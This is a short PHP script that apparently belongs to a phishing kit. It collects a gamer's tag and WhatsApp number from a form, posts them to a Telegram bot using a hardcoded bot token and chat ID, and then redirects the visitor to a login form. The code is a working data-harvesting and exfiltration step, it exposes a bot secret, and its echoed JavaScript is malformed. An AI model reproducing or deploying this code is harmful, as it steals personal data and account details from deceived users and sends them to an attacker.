<?php
    
    	if(isset($_POST["submit"]))
        {
        $gamertag = $_POST['gamertag'];
        $nowa = $_POST['nowa'];
        $message = "Gamertag : $gamertag | No Whatsapp : $nowa ";
        $url1 = "https://api.telegram.org/bot7388509821:AAEmO3MZlu853fnAld18QOI6VrgIldlBgeQ/sendMessage?chat_id=6645088602&text=$message";

        $curl1 = curl_init($url1);
        
        curl_exec($curl1);

        curl_close($curl1);

        $url2 = "https://api.telegram.org/bot7388509821:AAEmO3MZlu853fnAld18QOI6VrgIldlBgeQ/sendMessage?chat_id=6645088602&text= <-------------------------|  Next  |------------------------->";

        $curl2 = curl_init($url2);
        
        curl_exec($curl2);

        curl_close($curl2);

        echo"
        <script>
            alert(Data diTerima, Mohon Menunggu);
        </>script>
        ";

        header("location:loginform.php");
        }

?>